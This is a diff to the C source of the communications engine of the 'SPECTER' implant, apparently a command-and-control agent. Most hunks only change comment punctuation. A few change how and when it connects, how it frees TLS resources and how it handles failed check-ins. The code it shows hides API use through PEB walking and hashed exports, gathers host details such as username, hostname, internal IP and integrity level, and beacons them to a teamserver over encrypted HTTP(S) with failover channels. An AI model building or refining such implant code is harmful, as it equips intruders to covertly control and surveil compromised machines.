@@ -1,9 +1,9 @@
 /**
- * SPECTER Implant — Communications Engine
+ * SPECTER Implant - Communications Engine
  *
  * Raw socket operations via PEB-resolved ws2_32.dll, TLS via SChannel,
  * manual HTTP/1.1 request/response, and encrypted check-in protocol.
- * All API calls resolved dynamically — no static imports.
+ * All API calls resolved dynamically - no static imports.
  */
 
 #include "specter.h"
@@ -33,7 +33,7 @@ void task_collect_socks_output(IMPLANT_CONTEXT *ctx) {
 #endif
 
 /* ------------------------------------------------------------------ */
-/*  Internal helpers — integer to string                                */
+/*  Internal helpers - integer to string                                */
 /* ------------------------------------------------------------------ */
 
 static DWORD uint_to_str(DWORD val, char *buf, DWORD buf_size) {
@@ -64,7 +64,7 @@ static DWORD uint_to_str(DWORD val, char *buf, DWORD buf_size) {
 }
 
 /* ------------------------------------------------------------------ */
-/*  Internal helpers — hex encode                                      */
+/*  Internal helpers - hex encode                                      */
 /* ------------------------------------------------------------------ */
 
 __attribute__((unused))
@@ -78,7 +78,7 @@ static void hex_encode(const BYTE *data, DWORD len, char *out) {
 }
 
 /* ------------------------------------------------------------------ */
-/*  Internal helpers — little-endian I/O                                */
+/*  Internal helpers - little-endian I/O                                */
 /* ------------------------------------------------------------------ */
 
 static void store32_le_comms(BYTE *p, DWORD v) {
@@ -154,7 +154,7 @@ static DWORD g_tlv_buf_limit = 0;
 static DWORD tlv_put(BYTE *buf, DWORD pos, WORD tag, const BYTE *val, DWORD val_len) {
     DWORD needed = pos + 6 + val_len;
     if (g_tlv_buf_limit > 0 && needed > g_tlv_buf_limit)
-        return pos; /* refuse to write past buffer — return pos unchanged */
+        return pos; /* refuse to write past buffer - return pos unchanged */
     buf[pos]     = (BYTE)(tag & 0xFF);
     buf[pos + 1] = (BYTE)(tag >> 8);
     buf[pos + 2] = (BYTE)(val_len);
@@ -215,7 +215,7 @@ static DWORD gather_username(char *buf, DWORD buf_len) {
     typedef BOOL (__attribute__((ms_abi)) *fn_GetUserNameA)(char *, DWORD *);
     PVOID adv = find_module_by_hash(HASH_ADVAPI32_DLL);
     if (!adv) {
-        /* advapi32 might not be loaded — try LoadLibraryA */
+        /* advapi32 might not be loaded - try LoadLibraryA */
         typedef PVOID (__attribute__((ms_abi)) *fn_LoadLibraryA)(const char *);
         PVOID k32 = find_module_by_hash(HASH_KERNEL32_DLL);
         if (k32) {
@@ -549,7 +549,7 @@ static void parse_checkin_response(IMPLANT_CONTEXT *impl_ctx, COMMS_CONTEXT *com
             if (t->task_id[0] != 0 && t->task_type != 0) {
                 impl_ctx->pending_task_count++;
             } else {
-                /* Invalid task — free any allocated data */
+                /* Invalid task - free any allocated data */
                 if (t->data) {
                     task_free(t->data);
                     t->data = NULL;
@@ -578,7 +578,7 @@ static NTSTATUS comms_resolve_apis(COMMS_API *api) {
     fn_LoadLibraryA pLoadLib = (fn_LoadLibraryA)find_export_by_hash(k32, 0x0666395B);
     if (!pLoadLib) return (NTSTATUS)0xC0000161; /* 161 = no LoadLibraryA */
 
-    /* Resolve ws2_32.dll — try PEB first, fall back to LoadLibraryA */
+    /* Resolve ws2_32.dll - try PEB first, fall back to LoadLibraryA */
     PVOID ws2 = find_module_by_hash(HASH_WS2_32_DLL);
     if (!ws2) {
         char ws2_name[] = {'w','s','2','_','3','2','.','d','l','l',0};
@@ -629,7 +629,7 @@ static NTSTATUS comms_resolve_apis(COMMS_API *api) {
     api->pFreeContextBuffer          = (fn_FreeContextBuffer)find_export_by_hash(sec, HASH_FREECTXBUFFER);
     api->pApplyControlToken          = (fn_ApplyControlToken)find_export_by_hash(sec, HASH_APPLYCTRLTOKEN);
 
-    /* TLS (SChannel) exports are optional — HTTP channels don't need them.
+    /* TLS (SChannel) exports are optional - HTTP channels don't need them.
        Flag as resolved even if SSPI functions are missing; TLS init will
        check and fail gracefully if a TLS channel is requested. */
     api->tls_available = (api->pAcquireCredentialsHandleA &&
@@ -767,7 +767,7 @@ NTSTATUS comms_tls_init(COMMS_CONTEXT *ctx) {
 
     COMMS_API *api = &ctx->api;
 
-    /* TLS init is optional — skip if SChannel APIs weren't resolved */
+    /* TLS init is optional - skip if SChannel APIs weren't resolved */
     if (!api->tls_available)
         return STATUS_SUCCESS;
 
@@ -812,7 +812,7 @@ NTSTATUS comms_tls_handshake(COMMS_CONTEXT *ctx, const char *hostname) {
     SecBufferDesc out_desc = { SECBUFFER_VERSION, 1, &out_buf };
     ULONG attrs = 0;
 
-    /* Initial call — no input token */
+    /* Initial call - no input token */
     LONG status = api->pInitializeSecurityContextA(
         &ctx->cred_handle, NULL, (char *)hostname, isc_flags,
         0, 0, NULL, 0, &ctx->sec_context, &out_desc, &attrs, NULL);
@@ -1087,7 +1087,6 @@ NTSTATUS comms_tls_close(COMMS_CONTEXT *ctx) {
         ctx->context_valid = FALSE;
     }
 
-    api->pFreeCredentialsHandle(&ctx->cred_handle);
     return comms_tcp_close(ctx);
 #endif
 }
@@ -1236,7 +1235,7 @@ static BOOL parse_content_length_header(const BYTE *data, DWORD header_end, DWOR
  * Parse a 3-digit HTTP status code from the status line.
  */
 static DWORD parse_status_code(const BYTE *data, DWORD len) {
-    /* "HTTP/1.1 XXX ..." — status code starts at offset 9 */
+    /* "HTTP/1.1 XXX ..." - status code starts at offset 9 */
     if (len < 12) return 0;
 
     /* Find the space after HTTP/1.x */
@@ -1359,47 +1358,47 @@ static DWORD build_checkin_payload(IMPLANT_CONTEXT *impl_ctx, IMPLANT_CONFIG *cf
     pos = tlv_put(out, pos, TLV_IMPLANT_PUBKEY, cfg->implant_pubkey, 32);
     pos = tlv_put_u32(out, pos, TLV_CHECKIN_COUNT, cfg->checkin_count);
 
-    /* Host info — hostname */
+    /* Host info - hostname */
     char hostname[64];
     DWORD hlen = gather_hostname(hostname, sizeof(hostname));
     if (hlen > 0)
         pos = tlv_put_str(out, pos, TLV_HOSTNAME, hostname);
 
-    /* Host info — username */
+    /* Host info - username */
     char username[64];
     DWORD ulen = gather_username(username, sizeof(username));
     if (ulen > 0)
         pos = tlv_put_str(out, pos, TLV_USERNAME, username);
 
-    /* Host info — PID */
+    /* Host info - PID */
     DWORD pid = gather_pid();
     pos = tlv_put_u32(out, pos, TLV_PID, pid);
 
-    /* Host info — OS version */
+    /* Host info - OS version */
     char os_ver[32];
     DWORD olen = gather_os_version(os_ver, sizeof(os_ver));
     if (olen > 0)
         pos = tlv_put_str(out, pos, TLV_OS_VERSION, os_ver);
 
-    /* Host info — process name (from PEB InLoadOrderModuleList) */
+    /* Host info - process name (from PEB InLoadOrderModuleList) */
     char proc_name[128];
     DWORD plen = gather_process_name(proc_name, sizeof(proc_name));
     if (plen > 0)
         pos = tlv_put_str(out, pos, TLV_PROCESS_NAME, proc_name);
 
-    /* Host info — integrity level (via NtOpenProcessToken) */
+    /* Host info - integrity level (via NtOpenProcessToken) */
     char integrity[16];
     DWORD ilen = gather_integrity_level(integrity, sizeof(integrity));
     if (ilen > 0)
         pos = tlv_put_str(out, pos, TLV_INTEGRITY, integrity);
 
-    /* Host info — internal IP (via gethostname + gethostbyname) */
+    /* Host info - internal IP (via gethostname + gethostbyname) */
     char ip_buf[48];
     DWORD iplen = gather_internal_ip(ip_buf, sizeof(ip_buf));
     if (iplen > 0)
         pos = tlv_put_str(out, pos, TLV_INTERNAL_IP, ip_buf);
 
-    /* Task results — include completed/failed task results from previous cycle.
+    /* Task results - include completed/failed task results from previous cycle.
      * Each result is serialized as a nested TLV block (TASK_RESULT). */
     if (impl_ctx) {
         for (DWORD i = 0; i < impl_ctx->task_result_count; i++) {
@@ -1488,9 +1487,9 @@ static void generate_nonce(DWORD seq, const BYTE *pubkey, BYTE nonce[12]) {
 /* ------------------------------------------------------------------ */
 
 /**
- * Profile-driven check-in: builds payload → transform_send → profile_embed_data
- * → profile_build_headers → profile_get_uri → send → parse → profile_extract_data
- * → transform_recv → extract tasks.
+ * Profile-driven check-in: builds payload - transform_send - profile_embed_data
+ * - profile_build_headers - profile_get_uri - send - parse - profile_extract_data
+ * - transform_recv - extract tasks.
  *
  * Falls back to legacy wire format when no profile is attached.
  */
@@ -1504,7 +1503,7 @@ NTSTATUS comms_checkin(IMPLANT_CONTEXT *ctx) {
 
     task_collect_socks_output(ctx);
 
-    /* All heap-trackable pointers — no large stack buffers anywhere.
+    /* All heap-trackable pointers - no large stack buffers anywhere.
        Total stack footprint of this function: ~200 bytes (pointers + scalars). */
     NTSTATUS status = STATUS_UNSUCCESSFUL;
     BYTE *payload      = NULL;
@@ -1525,7 +1524,7 @@ NTSTATUS comms_checkin(IMPLANT_CONTEXT *ctx) {
 
     CHANNEL_CONFIG *ch = &cfg->channels[comms->active_channel];
 
-    /* Reconnect TCP for each checkin (HTTP/1.0 — server closes after response) */
+    /* Reconnect TCP for each checkin (HTTP/1.0 - server closes after response) */
     if (comms->state != COMMS_STATE_DISCONNECTED) {
         if (ch->needs_tls && comms->api.tls_available)
             comms_tls_close(comms);
@@ -1976,7 +1975,7 @@ typedef struct _COMMS_KSYSTEM_TIME {
     LONG  High2Time;
 } COMMS_KSYSTEM_TIME;
 
-/* Simple tick counter — returns monotonic ms value for backoff timing */
+/* Simple tick counter - returns monotonic ms value for backoff timing */
 static QWORD failover_get_tick(void) {
 #ifdef TEST_BUILD
     /* In tests, use a controllable tick source */
@@ -2150,7 +2149,7 @@ NTSTATUS comms_failover(IMPLANT_CONTEXT *ctx) {
             }
         }
 
-        /* Success — switch to this channel */
+        /* Success - switch to this channel */
         comms->active_channel = try_idx;
         try_cs->consecutive_fails = 0;
         try_cs->health = CHANNEL_HEALTHY;
@@ -2161,7 +2160,7 @@ NTSTATUS comms_failover(IMPLANT_CONTEXT *ctx) {
         return STATUS_SUCCESS;
     }
 
-    /* All channels exhausted — enter deep sleep mode */
+    /* All channels exhausted - enter deep sleep mode */
     comms->deep_sleep_mode = TRUE;
 
     /* Advance backoff for the failed channel */
@@ -2234,7 +2233,7 @@ NTSTATUS comms_retry_failed(IMPLANT_CONTEXT *ctx) {
     retry_cs->last_attempt = failover_get_tick();
 
     if (!NT_SUCCESS(status)) {
-        /* Failed — restore and advance backoff */
+        /* Failed - restore and advance backoff */
         comms->state = saved_state;
         comms->socket = saved_socket;
         comms->context_valid = saved_context_valid;
@@ -2260,7 +2259,7 @@ NTSTATUS comms_retry_failed(IMPLANT_CONTEXT *ctx) {
         }
     }
 
-    /* Success — switch to recovered channel, close old one */
+    /* Success - switch to recovered channel, close old one */
     /* The old socket was overwritten by tcp_connect, which is fine
        since we're switching channels */
     comms->active_channel = best_idx;
@@ -2287,7 +2286,7 @@ NTSTATUS comms_init(IMPLANT_CONTEXT *ctx) {
     IMPLANT_CONFIG *cfg = cfg_get(ctx);
     if (!cfg) return (NTSTATUS)0xC0000167; /* 167 = cfg_get returned null */
 
-    /* Initialize cached heap handle (Phase 0.5 — avoid PEB walk on every alloc) */
+    /* Initialize cached heap handle (Phase 0.5 - avoid PEB walk on every alloc) */
     if (!init_heap_cache())
         return (NTSTATUS)0xC0000168; /* 168 = heap cache init failed */
 
@@ -2320,7 +2319,7 @@ NTSTATUS comms_init(IMPLANT_CONTEXT *ctx) {
     ctx->comms_ctx = &g_comms_ctx;
 
     /* Derive session key: X25519(config_privkey, server_pubkey) + HKDF.
-       The config keypair is unique per build — no ephemeral key needed. */
+       The config keypair is unique per build - no ephemeral key needed. */
     BYTE shared_secret[X25519_KEY_SIZE];
     spec_x25519_scalarmult(shared_secret, cfg->implant_privkey, cfg->teamserver_pubkey);
 
@@ -2349,35 +2348,22 @@ NTSTATUS comms_init(IMPLANT_CONTEXT *ctx) {
     status = comms_tls_init(&g_comms_ctx);
     if (!NT_SUCCESS(status)) return (NTSTATUS)0xC0000170; /* 170 = TLS init */
 
-    /* Connect to primary channel */
+    /* Validate primary channel. comms_checkin() owns the per-checkin
+       connect/handshake lifecycle. */
     CHANNEL_CONFIG *ch = &cfg->channels[best_idx];
     if (!ch->url[0]) return (NTSTATUS)0xC0000171; /* 171 = no URL */
     if (ch->needs_tls && !g_comms_ctx.api.tls_available)
         return (NTSTATUS)0xC0000174; /* 174 = TLS required but unavailable */
 
-    COMMS_TRACE("[SPECTER] comms: tcp_connect...");
-    status = comms_tcp_connect(&g_comms_ctx, ch->url, ch->port);
-    if (!NT_SUCCESS(status)) return (NTSTATUS)0xC0000172; /* 172 = TCP connect */
-    COMMS_TRACE("[SPECTER] comms: tcp_connect OK");
-
-    /* TLS handshake — only for channels with https:// scheme */
-    if (ch->needs_tls) {
-        status = comms_tls_handshake(&g_comms_ctx, ch->url);
-        if (!NT_SUCCESS(status)) {
-            comms_tcp_close(&g_comms_ctx);
-            return (NTSTATUS)0xC0000173; /* 173 = TLS handshake */
-        }
-    }
 
     /* Perform initial registration check-in */
     COMMS_TRACE("[SPECTER] comms: first checkin...");
     COMMS_TRACE("[SPECTER] comms: about to call comms_checkin");
-    g_comms_ctx.state = COMMS_STATE_REGISTERED;
-    COMMS_TRACE("[SPECTER] comms: state set, calling now");
+    COMMS_TRACE("[SPECTER] comms: calling now");
     status = comms_checkin(ctx);
     COMMS_TRACE("[SPECTER] comms: comms_checkin returned");
     if (!NT_SUCCESS(status))
-        g_comms_ctx.state = COMMS_STATE_TLS_CONNECTED;
+        g_comms_ctx.state = COMMS_STATE_DISCONNECTED;
 
     return STATUS_SUCCESS;
 }
